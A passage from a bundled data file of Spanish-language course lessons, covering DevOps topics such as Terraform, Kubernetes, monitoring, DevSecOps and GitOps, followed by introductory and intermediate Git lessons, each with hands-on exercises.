Herramienta open-source que te permite definir infraestructura en archivos \`.tf\` y aplicarla en cualquier proveedor (AWS, Azure, GCP).

## 2. Flujo de Terraform
1.  **Write:** Escribes \`main.tf\`.
2.  **Init:** \`terraform init\`. Descarga los plugins del proveedor.
3.  **Plan:** \`terraform plan\`. Te muestra qu va a crear/borrar antes de hacerlo. (Modo simulacin).
4.  **Apply:** \`terraform apply\`. Ejecuta los cambios reales en la nube.

## 3. Ejemplo: Crear bucket S3

\`main.tf\`:
\`\`\`hcl
provider "aws" {
  region = "us-east-1"
}

resource "aws_s3_bucket" "mi_bucket" {
  bucket = "mi-bucket-unico-12345"
  
  tags = {
    Name        = "Mi bucket de Terraform"
    Environment = "Dev"
  }
}
\`\`\`

## 4. Estado (State File)
Terraform crea un archivo \`terraform.tfstate\`. Es su base de datos local para saber qu recursos administra. **Gurdalo como oro (y en remoto)!** Si lo pierdes, Terraform pierde el control de la infraestructura real.

---

### Misin Semi-Senior:
1. Instala Terraform.
2. Configura tus credenciales de AWS en tu terminal (\`aws configure\` o variables de entorno).
3. Escribe un archivo \`.tf\` para crear un archivo de texto local (provider "local") o un bucket S3 si te animas.
4. Ejecuta \`init\`, \`plan\` y \`apply\`.
5. Verifica que el recurso se cre.
6. Ejecuta \`terraform destroy\` para borrar todo limpiamente.
`,completed:!1},{id:"devops-14-monitoring-basico",title:"Monitoreo Bsico",level:"semi-senior",content:`# Leccin 14: Monitoring Bsico (Ojos en la oscuridad)

No puedes arreglar lo que no ves. El monitoreo te dice si tu sistema est vivo y sano.

## 1. Logs vs. Mtricas
*   **Logs:** Eventos discretos. Texto. "El usuario X fall login a las 10:00". Detalle forense.
*   **Mtricas:** Datos numricos en el tiempo. Series temporales. "Uso de CPU: 80%". Tendencias y alertas.

## 2. Elastic stack (ELK) vs Prometheus
*   **ELK (Elasticsearch, Logstash, Kibana):** El rey de los logs centrales. Buscas texto libre entre millones de lneas.
*   **Prometheus + Grafana:** El estndar para mtricas en Kubernetes.
    *   **Prometheus:** Recolecta (Scrape) mtricas de tus servicios cada X segundos.
    *   **Grafana:** Visualiza esas mtricas en dashboards bonitos.

## 3. Las 4 "Golden Signals" de Google
Qu monitorear si no sabes por dnde empezar:
1.  **Latencia:** Cunto tarda en responder?
2.  **Trfico:** Cuntas peticiones recibimos?
3.  **Errores:** Qu % de peticiones fallan (500s)?
4.  **Saturacin:** Cun "lleno" est el sistema (CPU/RAM)?

---

### Misin Semi-Senior:
Implementa logging estructurado en tu app Node.js.
1. En lugar de \`console.log("error")\`, usa una librera como \`winston\` o \`pino\`.
2. Configrala para que emita JSON.
   \`{"level": "info", "message": "Server started", "timestamp": "..."}\`
3. Los logs en JSON son legibles por mquinas y sistemas de monitoreo. Los logs de texto plano son basura difcil de procesar.
`,completed:!1},{id:"devops-15-proyecto-semi-senior",title:"Proyecto Final Semi-Senior",level:"semi-senior",content:`# Proyecto Final Nivel Semi-Senior: "Deploy Real con IaC y CI/CD"

Es hora de salir de localhost. Vas a desplegar en la nube usando las mejores prcticas.

## Objetivo
Desplegar una aplicacin containerizada en un entorno Cloud (AWS/DigitalOcean/Render) usando un pipeline automatizado.

## Requisitos Tcnicos

### 1. La App
Usa tu servidor web simple. Asegrate de que tenga:
*   \`Dockerfile\` optimizado (Multi-stage).
*   Logs en formato JSON.
*   Un endpoint \`/health\` que devuelva 200 OK (para el Load Balancer).

### 2. Infraestructura (Simulada o Real)
Opcin A (Real - Recomendada si tienes AWS):
*   Usa Terraform para crear un **EC2** y un **Security Group** (puerto 80 abierto).

Opcin B (Simulada/PaaS):
*   Despliegue en un servicio tipo Render/Railway usando su archivo de configuracin (Infrastructure as Code versin light).

### 3. El Pipeline (GitHub Actions)
El workflow debe:
1.  Correr Linter y Tests.
2.  Construir la imagen Docker.
3.  Pushear la imagen a Docker Hub (o GHCR).
4.  **Continuous Deployment:** Disparar el despliegue en el servidor.
    *   Si usas EC2: Conectarse por SSH y hacer \`docker pull\` y \`docker run\`.
    *   Si usas PaaS: Usar el Webhook de deploy.

## Entregable (Evaluacin)
*   URL pblica donde la app responda "Hola Mundo".
*   Repositorio con cdigo, Dockerfile y configuracin de CI/CD.
*   Captura de pantalla de tu Dashboard de monitoreo (o logs de la nube).

### Debugging Challenge (Bonus)
Rompe tu app a propsito (haz que \`/health\` devuelva 500).
Observa cmo el pipeline o el sistema de despliegue reacciona. Se detuvo el deploy? Te lleg una alerta? Escribe un post-mortem de 3 lneas.
`,completed:!1},{id:"devops-16-kubernetes-avanzado",title:"Kubernetes Avanzado",level:"senior",content:`# Leccin 16: Kubernetes Avanzado (Escalado y Gestin)

Ya lanzaste tu app. Ahora imagina que llegan 1 milln de usuarios. Tu cluster sobrevive?

## 1. HPA (Horizontal Pod Autoscaler)
El auto-escalado mgico. K8s monitorea el uso de CPU/RAM.
*   Si el consumo sube del 50%, crea ms Pods.
*   Si baja, mata Pods para ahorrar dinero.

\`\`\`yaml
apiVersion: autoscaling/v1
kind: HorizontalPodAutoscaler
metadata:
  name: mi-app-hpa
spec:
  scaleTargetRef:
    apiVersion: apps/v1
    kind: Deployment
    name: mi-app
  minReplicas: 2
  maxReplicas: 10
  targetCPUUtilizationPercentage: 50
\`\`\`

## 2. StatefulSets (Bases de Datos en K8s)
Los \`Deployments\` son para apps "stateless" (sin memoria). Si matas un pod, el nuevo es idntico.
Las Bases de Datos necesitan identidad. El nodo 1 es el "Primary", el 2 es "Replica".
*   **StatefulSet:** Garantiza orden de inicio (0 -> 1 -> 2) y persistencia de identidad.
*   Usa \`PVC\` (Persistent Volume Claim) para que cada rplica tenga su propio disco duro nube.

## 3. Helm (El gestor de paquetes)
Escribir YAMLs a mano es terrible. Helm es el "npm" de Kubernetes.
*   **Charts:** Paquetes preconfigurados (MySQL, Redis, Grafana).
*   **Comando:** \`helm install mi-redis bitnami/redis\`.
*   **Templating:** Permite usar variables en los YAMLs (\`{{ .Values.imageTag }}\`).

## 4. Arquitectura Distribuida
En produccin real, tu cluster puede abarcar mltiples zonas de disponibilidad (AZ) para resistir terremotos o cortes de fibra.
*   **Affinity/Anti-Affinity:** Reglas para decir "No pongas dos pods de mi app en el mismo nodo fsico" (para evitar que si cae el nodo, caiga toda la app).

---

### Misin Senior:
1. Instala el "Metrics Server" en tu cluster (necesario para HPA).
2. Configura un HPA para tu deployment.
3. Genera carga artificial (usa una herramienta como \`k6\` o \`hey\`).
4. Observa con \`kubectl get hpa -w\` cmo K8s crea nuevos pods automticamente bajo presin.
`,completed:!1},{id:"devops-17-arquitectura-cloud-avanzada",title:"Arquitectura Cloud Avanzada",level:"senior",content:`# Leccin 17: Arquitectura Cloud Avanzada (Alta Disponibilidad)

Disear sistemas que **nunca** caen (High Availability - HA).

## 1. Regiones y Zonas (AZ)
*   **Regin:** rea geogrfica (ej: USA East).
*   **Availability Zone (AZ):** Datacenter fsico aislado dentro de una regin. Si se inunda una AZ, la otra sigue viva.
*   **Regla de Oro:** Despliega siempre en al menos 2 AZs.

## 2. Load Balancers (ELB/ALB) y CDN
*   **Application Load Balancer (ALB):** Recibe el trfico y lo reparte entre tus servidores sanos. Hace "Health Checks". Si un servidor muere, deja de enviarle trfico.
*   **CDN (Content Delivery Network):** CloudFront, Cloudflare. Cach de tus archivos estticos (imgenes, JS) en cientos de servidores alrededor del mundo. Reduce la carga de tu backend en un 90%.

## 3. Microservicios vs Monolito
*   **Monolito:** Todo el cdigo en un solo binario. Fcil al inicio, difcil de escalar equipos grandes.
*   **Microservicios:** Pequeos servicios independientes (Users, Payments, Orders).
    *   *Ventaja:* Escalan independientemente (si Payments es lento, solo escalas Payments). Tecnologa agnstica (uno en Go, otro en Node).
    *   *Desventaja:* Complejidad brutal de red y trazabilidad.

## 4. Disaster Recovery (DR)
Qu pasa si AWS pierde toda la regin de Virginia?
*   **Backup & Restore:** Lento pero barato.
*   **Pilot Light:** Base de datos replicada en otra regin, servidores apagados.
*   **Multi-Region Active-Active:** Tu app corre en USA y Europa a la vez. Trfico se dirige por geolocalizacin. Carsimo y complejo, pero indestructible.

---

### Misin Senior:
Disea en un diagrama (Draw.io) una arquitectura para un e-commerce global:
1. Usa CloudFront (CDN) para el frontend.
2. Balanceador de Carga distribuyendo trfico a 2 AZs.
3. Base de Datos RDS con una "Read Replica" en otra zona.
4. Explica qu pasa si la Zona A se queda sin electricidad.
`,completed:!1},{id:"devops-18-devsecops",title:"DevSecOps",level:"senior",content:`# Leccin 18: DevSecOps (Seguridad Integrada)

La seguridad no es un equipo que revisa al final. Es parte del pipeline. "Shift Security Left".

## 1. Gestin de Secretos (Secrets Management)
El error #1: Subir API Keys a Git.
*   **Herramientas:** Vault (Hashicorp), AWS Secrets Manager, SOPS.
*   **En K8s:** Usa \`ExternalSecrets\` operator para sincronizar secretos de AWS hacia K8s automticamente. Nunca escribas base64 manual.

## 2. Escaneo de Vulnerabilidades (SCA & SAST)
*   **SCA (Software Composition Analysis):** Analiza tus libreras (\`node_modules\`). "Est usando una versin de 'axios' hackeada?".
    *   Herramienta: \`npm audit\`, \`Snyk\`, \`Trivy\`.
*   **SAST (Static Application Security Testing):** Analiza tu cdigo fuente. "Ests concatenando SQL manualmente? (Inyeccin SQL)".
    *   Herramienta: \`SonarQube\`, \`CodeQL\`.

## 3. Container Hardening
Los contenedores por defecto son inseguros.
*   Usa imgenes "Distroless" (sin shell, sin package manager). Solo tienen tu binario.
*   **Read-Only Root Filesystem:** Evita que un atacante modifique archivos del sistema.
*   **Non-Root User:** Obligatorio.

## 4. IAM Avanzado (Principle of Least Privilege)
Dale a cada servicio SOLAMENTE los permisos que necesita.
*   Tu Lambda necesita leer S3? Dale permiso \`s3:GetObject\` solo en ESE bucket. No le des \`s3:*\`.

---

### Misin Senior:
Vamos a hackear (y parchear) tu pipeline.
1. Integra **Trivy** en tu GitHub Action.
2. Haz que el pipeline FALLE si encuentra una vulnerabilidad "CRITICAL".
3. Intenta construir una imagen vieja (ej: \`node:10\`). El pipeline debera bloquearte el paso a produccin.
`,completed:!1},{id:"devops-19-observabilidad",title:"Observabilidad Completa",level:"senior",content:`# Leccin 19: Observabilidad Completa (Ms all de los logs)

Monitoring te dice "El sistema funciona". Observabilidad te permite preguntar "Por qu se rompi?".

## 1. Los 3 Pilares
1.  **Logs:** Eventos. (ELK, Loki).
2.  **Metrics:** Nmeros. (Prometheus, Datadog).
3.  **Traces:** El camino de una peticin.

## 2. Distributed Tracing (Jaeger / OpenTelemetry)
En microservicios, una peticin del usuario toca 10 servicios. Si falla, cul fue?
*   **Trace ID:** Un ID nico se genera en el Frontend y se pasa en los Headers HTTP a cada microservicio.
*   **Visualizacin:** Ves una cascada ("Waterfall") de tiempos. "Users tard 5ms, Payments tard 5000ms". Aqu est el problema!

## 3. Prometheus Avanzado (AlertManager)
No mires pantallas todo el da. Configura alertas.
*   "Si el % de errores 500 es > 1% por 5 minutos, manda alerta a Slack".
*   "Si el disco est al 90%, manda PagerDuty (despierta al ingeniero de guardia)".

## 4. Dashboards de Negocio
Grafana no es solo para CPU.
*   "Dinero procesado por minuto".
*   "Nuevos usuarios registrados".
*   Si las mtricas de negocio caen a cero, el sistema est roto aunque la CPU est bien.

---

### Misin Senior:
1. Levanta un stack de monitoreo local (Prometheus + Grafana + Loki) usando Docker Compose.
2. Instrumenta tu app para exponer mtricas en \`/metrics\` (formato Prometheus).
3. Crea un Dashboard en Grafana que muestre las peticiones por segundo (RPS) de tu app.
`,completed:!1},{id:"devops-20-gitops",title:"GitOps (ArgoCD)",level:"senior",content:`# Leccin 20: GitOps (ArgoCD)

Deja de hacer \`kubectl apply\` manualmente. Eso es peligroso y opaco. El estado del cluster debe reflejar exactamente el estado de Git.

## 1. Qu es ArgoCD?
Un agente que vive dentro de tu cluster Kubernetes.
*   Mira un repositorio Git ("config-repo").
*   Mira el estado actual del cluster.
*   Si son diferentes, **Sincroniza** (aplica los cambios automticamente).

## 2. Flujo GitOps
1.  Haces un cambio en el cdigo de la App. CI corre pruebas y pushea nueva imagen docker \`v2\`.
2.  CI hace un commit automtico al repo de configuracin: actualiza \`deployment.yaml\` para usar imagen \`v2\`.
3.  ArgoCD detecta el cambio en Git.
4.  ArgoCD actualiza el cluster.

## 3. Ventajas
*   **Auditabilidad:** Git log me dice quin cambi la infra, cundo y por qu.
*   **Revert:** Se rompi produccin? \`git revert\` en el repo de configuracin. ArgoCD revierte el cluster al estado anterior al instante.
*   **Seguridad:** Tus desarrolladores no necesitan acceso directo al cluster (kubectl). Solo necesitan permiso de Push a Git.

---

### Misin Senior:
(Terica/Prctica si tienes cluster):
Instala ArgoCD en tu cluster (o minikube).
1. Crea un repo Git simple con un YAML de Nginx.
2. Conecta ArgoCD a ese repo.
3. Cambia en Git el nmero de rplicas de 1 a 5.
4. Mira en ArgoCD cmo se sincroniza y aparecen los pods mgicamente.
`,completed:!1},{id:"devops-21-optimizacion-costos",title:"Optimizacin y Costos (FinOps)",level:"senior",content:`# Leccin 21: Optimizacin y Costos (FinOps)

La nube es infinita, tu tarjeta de crdito no. Un Senior cuida la billetera de la empresa.

## 1. Instancias Spot (Preemptible)
Servidores sobrantes que AWS te alquila con 90% de descuento.
*   **La trampa:** Te los pueden quitar con 2 minutos de aviso.
*   **Uso:** Para procesos batch, workers de cola, o nodos de K8s stateless. Nunca para Bases de Datos.

## 2. Dimensionamiento Correcto (Right Sizing)
*   No uses una instancia \`2xlarge\` (64GB RAM) si tu app usa 500MB.
*   Usa mtricas (Prometheus) para ver el uso real y ajusta los \`requests\` y \`limits\` en Kubernetes.

## 3. Serverless (Lambda)
Por qu pagar un servidor prendido 24/7 si solo tienes trfico de 9am a 5pm?
*   Serverless cobra por milisegundo de ejecucin. Si nadie visita tu sitio, pagas $0.

## 4. Cost Management
*   **Tags:** Etiqueta TODO (\`env=prod\`, \`team=payments\`).
*   **Presupuestos:** Configura alertas de facturacin. "Avsame si gasto ms de $50".
*   **Clean up:** Automatiza el borrado de recursos de desarrollo los fines de semana.

---

### Misin Senior:
Auditora de Costos Simulada.
Tienes un cluster con 10 nodos \`m5.large\` corriendo 24/7 al 10% de CPU.
Propn una estrategia para reducir la factura en un 50% sin afectar la disponibilidad.
(Pistas: HPA, Spot Instances, Auto-shutdown en dev).
`,completed:!1},{id:"devops-22-proyecto-final-senior",title:"Proyecto Final Senior DevOps",level:"senior",content:`# Proyecto Final Nivel Senior: "Arquitectura Empresarial Resiliente"

Vas a disear e implementar la infraestructura para un banco digital ficticio.

## Requerimientos

### 1. Arquitectura
*   **Microservicios:** Simula 2 servicios bsicos (\`api-gateway\`, \`auth-service\`).
*   **Alta Disponibilidad:** Deben correr en Kubernetes con al menos 2 rplicas cada uno.
*   **Ingress:** Acceso a travs de un Ingress Controller.

### 2. Pipeline DevSecOps
*   GitHub Actions workflow completo.
*   **CI:** Tests -> Lint -> Build Docker.
*   **Seguridad:** Escaneo de imagen con Trivy (debe bloquear vulnerabilidades crticas).
*   **CD (GitOps):** El pipeline no despliega directo. Actualiza un manifiesto en un repo de Git para que ArgoCD lo tome (simulado si no tienes ArgoCD: haz que el pipeline haga \`kubectl apply\` pero explica por qu no es ideal).

### 3. Observabilidad
*   Los servicios deben exponer mtricas Prometheus.
*   Dashboard de Grafana (JSON exportado) que muestre salud y trfico.
*   Alarmas configuradas (simuladas en documento).

### 4. Defensa Tcnica (Documento)
Escribe un \`ARCHITECTURE.md\` explicando:
*   Cmo manejas los secretos? (Vault/Secrets Manager).
*   Cmo escalas si el trfico se multiplica por 10? (HPA + Cluster Autoscaler).
*   Estrategia de Disaster Recovery?

## Evaluacin
Este proyecto demuestra que no solo saber "tirar comandos", sino que entiendes el ciclo de vida completo, la seguridad y la operacin del software a escala masiva. Eres un Ingeniero DevOps Senior!
`,completed:!1}]},av={id:"git",title:"Git y GitHub Profesional",description:"Domina el control de versiones. De comandos bsicos a flujos de trabajo empresariales (Git Flow) y colaboracin en GitHub.",completed:!0,track:"Herramientas Esenciales",lessons:[{id:"git-01-que-es-git",title:"Qu es Git?",level:"junior",content:`# Leccin 1: Qu es Git? (Y por qu no es lo mismo que GitHub)

Bienvenido a la herramienta ms importante de tu carrera. Puedes ser un genio programando, pero si no sabes Git, no puedes trabajar en equipo.

## 1. El Problema: "Versin Final Real Definitiva.zip"
Antes de Git, guardar versiones de tu cdigo era un desastre:
*   \`proyecto_v1.zip\`
*   \`proyecto_v2_arreglado.zip\`
*   \`proyecto_v3_final_final.zip\`

Si queras volver a la v1, tenas que descomprimir y perder lo nuevo. Si dos personas editaban el mismo archivo a la vez... el caos.

## 2. La Solucin: Control de Versiones Distribuido (DVCS)
**Git** es un sistema que rastrea los cambios en los archivos.
*   **Historial:** Git recuerda cada cambio que has hecho en la historia del proyecto.
*   **Viaje en el tiempo:** Puedes volver a cualquier punto del pasado sin perder el futuro.
*   **Colaboracin:** Permite que mltiples personas trabajen en los mismos archivos sin sobrescribirse (la mayora de las veces).

## 3. Git vs. GitHub (La confusin clsica)
No son lo mismo. Es como comparar "Pornografa" con "Pornhub" (o MP3 con Spotify).
*   **Git:** Es el software que instalas en tu computadora. Funciona sin internet. Es la tecnologa.
*   **GitHub:** Es una pgina web (un servicio en la nube) donde subes tus repositorios de Git para compartirlos. Otros servicios son GitLab o Bitbucket.

## 4. Por qu es Distribuido?
En sistemas antiguos (SVN), haba un servidor central. Si el servidor caa, nadie poda trabajar.
En Git, **t tienes una copia completa de todo el historial en tu mquina**. Si GitHub desaparece maana, tu proyecto est a salvo en tu laptop.

---

### Misin Junior:
Instala Git en tu mquina si no lo tienes (\`git --version\` en la terminal). Configura tu identidad global (tu nombre y email) para que tus cambios tengan tu firma:
\`\`\`bash
git config --global user.name "Tu Nombre"
git config --global user.email "tu@email.com"
\`\`\`
Esto es tu "tarjeta de presentacin" en cada cambio.
`,completed:!0},{id:"git-02-repositorio",title:"Qu es un Repositorio?",level:"junior",content:`# Leccin 2: Qu es un Repositorio?

Un "repo" es simplemente una carpeta... con superpoderes.

## 1. La Carpeta Mgica \`.git\`
Cuando transformas una carpeta normal en un repositorio Git, se crea una carpeta oculta llamada \`.git\`.
*   **ADVERTENCIA:** JAMS toques nada dentro de esa carpeta manualmente. Es el cerebro de Git. Si la borras, pierdes todo el historial (pero no tus archivos actuales).

## 2. Los Tres Estados de Git
Para entender Git, debes entender dnde "viven" tus archivos.
1.  **Working Directory (Directorio de Trabajo):** Tu carpeta normal. Donde editas, borras y creas archivos. Es tu "presente".
2.  **Staging Area (rea de Preparacin / Index):** Un "limbo" donde colocas los archivos que *quieres* guardar en la prxima versin. Es como preparar la pose para una foto.
3.  **Repository (Repositorio / HEAD):** Donde Git guarda las "fotos" permanentes (commits) de tu proyecto. Es el historial inmutable.

## 3. Comandos Iniciales
Para empezar a usar Git en tu proyecto:

### git init
Convierte la carpeta actual en un repositorio nuevo.
\`\`\`bash
cd mi-proyecto
git init
\`\`\`
*(Se crea la carpeta oculta .git)*

### git clone
Descarga un repositorio completo desde internet (GitHub) a tu mquina.
\`\`\`bash
git clone https://github.com/usuario/proyecto.git
\`\`\`
Esto ya hace el \`init\` automticamente y trae todo el historial.

---

### Misin Junior:
Crea una carpeta nueva llamada \`laboratorio-git\`. Entra en ella y ejecuta \`git init\`. Observa si aparece la carpeta oculta \`.git\` (necesitars activar "ver archivos ocultos" en tu sistema operativo). Acabas de crear tu primer universo paralelo!
`,completed:!0},{id:"git-03-comandos-basicos",title:"Add, Commit y Status",level:"junior",content:`# Leccin 3: Add, Commit y Status (El Ciclo de Vida)

El 90% de tu tiempo en Git usars solo estos 3 comandos. Aprndelos de memoria.

## 1. git status (El Navegador)
Te dice en qu estado est tu proyecto.
*   Qu archivos modifiqu?
*   Qu archivos estn listos para guardarse?
*   Qu archivos son nuevos y Git no los conoce (Untracked)?

*Regla de oro:* Si ests perdido, escribe \`git status\`.

## 2. git add (Preparar la Foto)
Mueve los cambios del **Working Directory** al **Staging Area**.
Le dices a Git: *"Oye, quiero incluir este archivo en la prxima versin"*.

\`\`\`bash
# Agregar un archivo especfico
git add index.html

# Agregar TODO lo que cambi (muy comn)
git add .
\`\`\`

## 3. git commit (Tomar la Foto)
Mueve los cambios del **Staging Area** al **Repository**.
Crea un punto en la historia al que puedes volver.

\`\`\`bash
git commit -m "Agrega barra de navegacin al home"
\`\`\`

### El Mensaje de Commit
El \`-m "..."\` es vital.
*    \`git commit -m "cambios"\` (No dice nada. Te odiarn).
*    \`git commit -m "fix"\` (Qu arreglaste?).
*    \`git commit -m "Arregla error de validacin en el login"\` (Profesional).

## 4. El Flujo Completo
1.  Editas \`style.css\`.
2.  \`git status\` -> Muestra \`style.css\` en rojo (modificado).
3.  \`git add style.css\`.
4.  \`git status\` -> Muestra \`style.css\` en verde (listo para commit).
5.  \`git commit -m "Cambia color de fondo a azul"\`.
6.  \`git status\` -> "Working tree clean" (Todo guardado).

---

### Misin Junior:
En tu carpeta \`laboratorio-git\`:
1. Crea un archivo \`hola.txt\` con texto.
2. Usa \`git status\`.
3. Usa \`git add .\`
4. Haz tu primer commit: \`git commit -m "Primer commit: Creacin de hola.txt"\`.
5. Modifica el archivo y repite el proceso.
`,completed:!0},{id:"git-04-branches",title:"Branches (Ramas)",level:"junior",content:`# Leccin 4: Branches (Ramas) - El Multiverso

Imagina que puedes crear una copia paralela de tu proyecto para experimentar, y si rompes todo, no afecta al proyecto original. Eso son las Ramas.

## 1. La Rama Principal (main / master)
Por defecto, Git crea una rama llamada \`main\` (o \`master\` en versiones viejas).
*   Esta es la "verdad oficial" del proyecto.
*   **Regla:** Nunca hagas cambios experimentales directo en \`main\`.

## 2. Creando Ramas (Parallel Universes)
Cuando creas una rama, te separas de la lnea temporal principal. Puedes borrar archivos, romper cdigo, y \`main\` sigue intacto.

\`\`\`bash
# Crear una rama llamada "nueva-funcionalidad"
git branch nueva-funcionalidad

# Moverte a esa rama (activar ese universo)
git checkout nueva-funcionalidad
# o en versiones modernas de Git:
git switch nueva-funcionalidad
\`\`\`

**Atajo pro:** Crear y moverte en un solo comando:
\`\`\`bash
git checkout -b nueva-funcionalidad
\`\`\`

## 3. Por qu usar Ramas?
En un equipo profesional, cada tarea se hace en su propia rama:
*   \`feature/login-page\`
*   \`bugfix/header-alignment\`
*   \`experiment/new-colors\`

As, si la rama de Juan rompe el sitio, no afecta el trabajo de Mara ni el sitio en produccin.

---

### Misin Junior:
Ests en \`main\`.
1. Crea una rama \`feature/fondo-rojo\`.
2. Muvete a ella (\`git checkout feature/fondo-rojo\`).
3. Modifica tu archivo de texto para decir "Todo es Rojo".
4. Haz \`add\` y \`commit\`.
5. Vuelve a \`main\` (\`git checkout main\`).
6. Magia! El archivo vuelve a decir lo que deca antes. El cambio "Rojo" solo existe en la otra dimensin.
`,completed:!0},{id:"git-05-merge-basico",title:"Merge Bsico",level:"junior",content:'# Leccin 5: Merge Bsico (Unificando Dimensiones)\n\nCreaste una rama, hiciste cambios maravillosos y funcionan. Ahora quieres traer esos cambios de vuelta a la rama principal (`main`). Eso es un **Merge**.\n\n## 1. El Proceso de Fusin\nSiempre se hace desde la rama de *destino* (a donde quieres que lleguen los cambios).\n\n**Escenario:** Quieres traer los cambios de `feature/login` hacia `main`.\n\n1.  Muvete al destino:\n    ```bash\n    git checkout main\n    ```\n2.  Ejecuta el merge trayendo la otra rama:\n    ```bash\n    git merge feature/login\n    ```\n\n## 2. Tipos de Merge\n\n### A. Fast-Forward (El Sencillo)\nSi `main` no ha avanzado desde que creaste tu rama, Git simplemente "mueve el puntero" hacia adelante. El historial queda lineal. Es como si nunca te hubieras separado.\n\n### B. Merge Commit (La Unin Real)\nSi `main` avanz (alguien ms meti cambios) y tu rama tambin, Git crea un nuevo commit especial ("Merge Commit") para unir ambas historias. El historial muestra que hubo una bifurcacin.\n\n## 3. Conflictos (El Terror del Junior)\nQu pasa si en `main` alguien cambi la lnea 10 de `hola.txt` y t en tu rama cambiaste la MISMA lnea 10 con otra cosa? Git entra en pnico.\n\n*   Git se detiene y te dice: "AUTO-MERGE FAILED".\n*   Debes abrir el archivo. Vers algo as:\n\n```text\n<<<<<<< HEAD\nCambio que estaba en main\n=======\nCambio que traigo de mi rama\n>>>>>>> feature/login\n```\n\n**T decides:** Borra las marcas extraas (`<<<<`, `====`, `>>>>`) y deja el cdigo como debe quedar. Luego haces `add` y `commit` para terminar el merge.\n\n---\n\n### Misin Junior:\n1. Desde tu rama `main`, haz merge de tu rama `feature/fondo-rojo`.\n2. Como `main` no haba cambiado, debera ser un "Fast-forward".\n3. Verifica que ahora en `main` tienes los cambios que hiciste en la otra rama.\n4. Borra la rama vieja si ya no la necesitas: `git branch -d feature/fondo-rojo`.\n',completed:!0},{id:"git-06-rebase",title:"Rebase vs. Merge",level:"semi-senior",content:`# Leccin 6: Rebase vs. Merge (Reescribiendo la Historia)

Hasta ahora has usado \`merge\` para unir ramas. Pero hay otra forma: \`rebase\`. Esta es la herramienta favorita de los puristas que aman un historial limpio.

## 1. Cul es la diferencia?
Imagina que tienes una rama \`main\` y una rama \`feature\`. Ambas han avanzado.

### Merge
*   **Qu hace:** Crea un "nudo" en la historia. Un commit especial que une las dos lneas.
*   **Resultado:** El historial es "honesto". Muestra exactamente cundo te separaste y cundo volviste. Si hay muchos merges, parece un mapa de metro complejo (Spaghetti).
*   **Comando:** \`git merge feature\`

### Rebase
*   **Qu hace:** Corta tu rama \`feature\` de donde naci, y la "pega" al final de \`main\`.
*   **Resultado:** El historial es "lineal". Parece que hiciste tus cambios *despus* de todo lo que pas en \`main\`, una secuencia perfecta.
*   **Comando:**
    \`\`\`bash
    git checkout feature
    git rebase main
    \`\`\`

## 2. La Regla de Oro del Rebase
**NUNCA hagas rebase en ramas pblicas (compartidas)!**
Rebase **reescribe la historia**. Cambia los IDs (hashes) de los commits.
*   Si fulanito tiene tu rama en su mquina y t haces un rebase y lo subes (force push), rompers el repositorio de fulanito.
*   **Uso correcto:** Haz rebase en TU rama local antes de hacer un Pull Request, para limpiar tu historia y estar al da con \`main\`.

## 3. Rebase Interactivo (\`git rebase -i\`)
La herramienta ms poderosa para limpiar tu desorden antes de compartirlo. Te permite:
*   Fusionar varios commits pequeos en uno solo (**Squash**).
*   Cambiar el orden de los commits.
*   Reescribir mensajes de commit antiguos.

Ejemplo: Convertir 5 commits tipo "wip", "fix", "typo" en un solo commit slido "feat: implementa login".

---

### Misin Semi-Senior:
En tu repo de laboratorio:
1. Crea dos ramas y haz commits en ambas.
2. En una, usa \`git rebase main\` en lugar de merge.
3. Observa cmo el historial se vuelve una lnea recta con \`git log --graph --oneline --all\`.
`,completed:!0},{id:"git-07-cherry-pick",title:"Cherry-pick",level:"semi-senior",content:`# Leccin 7: Cherry-pick (Francotirador de Commits)

A veces no quieres fusionar *toda* una rama. Solo quieres **ese** commit especfico que arregl un bug crtico.

## 1. El Concepto
\`cherry-pick\` toma un commit especfico de cualquier lugar del historial y lo aplica en tu rama actual como si fuera un cambio nuevo.

## 2. El Comando
Primero, necesitas el ID (Hash) del commit que quieres robar. Usa \`git log\`. Digamos que es \`a1b2c3d\`.

\`\`\`bash
git checkout main
git cherry-pick a1b2c3d
\`\`\`

Git copiar los cambios exactos de ese commit y crear un nuevo commit en \`main\` con el mismo mensaje (y un nuevo Hash, porque el contexto cambi).

## 3. Cundo usarlo?
*   **Hotfixes:** Arreglaste un bug en la rama \`develop\` (desarrollo), pero necesitas aplicar ese arreglo YA en \`production\` sin llevarte las funcionalidades a medio terminar. Haces cherry-pick del fix a la rama de produccin.
*   **Errores de Rama:** Hiciste un commit en la rama equivocada. Haces cherry-pick a la rama correcta y luego (opcionalmente) borras el commit de la rama original (\`git reset\`).

## 4. Riesgos
Si abusas del cherry-pick, puedes terminar con **commits duplicados** (mismo contenido, diferente ID) lo que causar conflictos confusos en el futuro. salo con moderacin.

---

### Misin Semi-Senior:
1. Crea una rama \`experimento\`.
2. Haz 3 commits diferentes en ella.
3. Vuelve a \`main\`.
4. Elige solo el *segundo* commit de \`experimento\` y trelo a \`main\` con \`cherry-pick\`.
5. Verifica que solo tienes ese cambio y no los otros dos.
`,completed:!0},{id:"git-08-conflictos-avanzados",title:"Resolucin de Conflictos Avanzada",level:"semi-senior",content:`# Leccin 8: Resolucin de Conflictos Avanzada

Los conflictos no son errores, son **decisiones que Git no puede tomar por ti**.

## 1. Anatoma de un Conflicto
Ocurre cuando dos ramas modifican **las mismas lneas del mismo archivo** de formas diferentes, o cuando uno modifica y el otro borra el archivo.

## 2. Herramientas de Merge (Merge Tools)
Resolver conflictos editando \`<<<<<<<\` a mano en Notepad es doloroso.
Configura VS Code como tu herramienta de merge:
\`\`\`bash
git config --global merge.tool vscode
\`\`\`
Cuando tengas un conflicto, VS Code te mostrar botones bonitos: "Accept Current Change", "Accept Incoming Change", "Accept Both".

## 3. "Theirs" vs "Ours"
A veces sabes que una rama tiene la razn absoluta.
*   \`--ours\`: "Lo que yo tengo en mi rama actual es lo correcto".
*   \`--theirs\`: "Lo que viene de la otra rama es lo correcto".

\`\`\`bash
git checkout --theirs archivo_conflictivo.txt
\`\`\`
*(Cuidado: Esto es destructivo para tus cambios si te equivocas).*

## 4. Abortar Misin
Si ests en medio de un merge conflictivo y te das cuenta de que es un desastre total:
\`\`\`bash
git merge --abort
\`\`\`
Esto regresa todo al estado antes de intentar el merge. Como si nada hubiera pasado.

## 5. Rerere (Reuse Recorded Resolution)
Una funcionalidad oculta y mgica de Git. Si activas \`rerere\`, Git **recordar** cmo resolviste un conflicto. Si en el futuro vuelve a ocurrir el mismo conflicto (comn en rebases largos), Git aplicar tu solucin automticamente.

---

### Misin Semi-Senior:
Fuerza un conflicto "imposible".
1. En \`main\`, borra un archivo importante.
2. En una rama, modifica ese mismo archivo.
